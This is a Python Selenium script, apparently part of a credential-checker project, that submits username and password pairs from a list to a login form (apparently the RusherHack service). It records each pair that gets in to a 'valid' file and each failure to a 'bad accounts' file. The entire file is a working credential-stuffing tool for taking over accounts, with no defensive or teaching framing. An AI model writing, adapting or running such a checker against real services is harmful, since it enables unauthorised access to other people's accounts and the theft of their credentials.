from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.firefox.options import Options
import time

from checkers.Abyss import saved_credentials
from checkers.Future import credentials_list
from checkers.util.main.util import r_0_5_0_6
from checkers.util.rusherhack.util import url, bad_url, check_url, options, driver

#sorter
def split_string(input_string):
    pairs = input_string.splitlines()
    credentials = []
    for pair in pairs:
        parts = pair.split(':')
        if len(parts) == 2:
            before = parts[0].strip()
            after = parts[1].strip()
            credentials.append((before, after))
    return credentials

#open output file
with open('../txt/output_rusherhack.txt', 'r', encoding='utf-8') as file:
    input_str = file.read()
#checker
for username, password in credentials_list:
    driver.get(url=url)
    time.sleep(r_0_5_0_6)

    try:
        username_field = driver.find_element(By.NAME, 'username')
        password_field = driver.find_element(By.NAME, 'password')
        submit_button = driver.find_element(By.XPATH, "//input[@type='submit']")

        username_field.send_keys(username)
        password_field.send_keys(password)
        submit_button.click()

        time.sleep(r_0_5_0_6)

        if check_url in driver.current_url:
            saved_credentials.append((username, password))
            print(f"Successful login: {username}:{password}")
            with open('../valid_rusherhack.txt', 'a') as f:
                f.write(f"{username}:{password}\n")
        elif bad_url in driver.current_url:
            with open('../txt/badaccs_rusherhack.txt', 'a') as b:
                b.write(f"{username}:{password}\n")
    except Exception as e:
        print(f"Error: {username}:{password}: {e}")

        if username == credentials_list[-1] or e:
            driver.quit()
driver = None
